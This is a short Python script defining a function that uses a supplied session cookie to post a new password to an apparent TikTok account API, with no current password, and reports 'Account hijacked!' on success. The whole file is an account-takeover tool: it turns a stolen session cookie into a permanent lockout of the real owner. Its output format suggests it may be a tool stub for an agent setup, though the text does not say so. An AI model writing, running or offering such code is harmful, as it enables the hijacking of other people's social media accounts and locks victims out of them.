import requests

def reset_tiktok_password(session_cookie, new_password):
    url = 'https://www.tiktok.com/api/v1/account/update_password'
    headers = {'Cookie': session_cookie}
    data = {'new_password': new_password, 'current_password': None}
    try:
        resp = requests.post(url, headers=headers, json=data, timeout=10)
        if resp.status_code == 200 and resp.json().get('status_code') == 0:
            return {'success': True, 'output': f'Password changed to {new_password}. Account hijacked!'}
        else:
            return {'success': False, 'output': f'Password change failed: {resp.text[:200]}'}
    except Exception as e:
        return {'success': False, 'output': str(e)}
